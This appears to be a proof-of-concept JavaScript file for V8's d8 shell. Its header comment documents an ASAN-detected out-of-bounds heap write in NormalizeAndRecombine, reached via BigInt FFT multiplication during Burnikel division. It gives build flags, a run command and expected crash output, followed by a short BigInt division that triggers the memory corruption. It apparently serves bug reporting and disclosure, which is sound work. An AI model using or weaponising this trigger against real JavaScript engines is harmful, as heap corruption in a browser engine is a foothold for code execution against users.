// ============================================================================
// PoC: ASAN heap-buffer-overflow via NormalizeAndRecombine OOB Write
// ============================================================================
//
// This PoC triggers an ASAN heap-buffer-overflow WRITE in NormalizeAndRecombine
// when built with v8_enable_sandbox = false and is_asan = true.
//
// The OOB write goes past a new digit_t[] allocation (ScratchDigits),
// which ASAN instruments with redzones.
//
// BUILD: is_asan=true, v8_enable_sandbox=false, v8_advanced_bigint_algorithms=true
// RUN:   ./d8 poc/poc_asan_oob.js
//
// EXPECTED OUTPUT:
//   ==PID==ERROR: AddressSanitizer: heap-buffer-overflow on address XXX
//   WRITE of size 8 at XXX thread T0
//     #0 NormalizeAndRecombine src/bigint/bigint.h:163
//     #1 MultiplyFFT src/bigint/mul-fft.cc:870
//     ...
//     #4 D3n2n src/bigint/div-burnikel.cc:144
//   XXX is located 0 bytes after N-byte region
//
// ============================================================================

const x = 123456n;
const a = 31337n ** x;
const b = 42n ** x;

try {
  const c = a / b;
  print("Division completed (OOB not detected)");
} catch (e) {
  print("Exception: " + e);
}
